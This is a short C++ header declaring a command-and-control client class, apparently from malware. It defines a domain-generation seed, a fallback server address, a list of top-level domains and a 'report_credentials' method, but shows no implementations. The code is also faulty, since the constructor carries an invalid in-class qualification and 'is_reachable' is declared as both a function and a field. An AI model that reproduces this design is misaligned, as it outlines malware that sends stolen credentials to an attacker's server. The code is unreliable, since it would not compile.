#pragma once
#include "../types/types.h"

class C2 {
public:
	
	C2::C2(int dga, const char* fba, const stringvec &tlds) : dgaseed{ dga }, fallbackaddr{ fba }, topleveldomains{tlds} {}
	
	bool is_reachable();
	void check_now();
	void report_credentials(const char* creds);

private:

	const char* get_basedomain();
	void find_c2();
	bool is_connection_alive();

	int dgaseed = 0;
	const char* fallbackaddr;
	const char* curraddr = "";
	stringvec topleveldomains;
	bool is_reachable = false;
};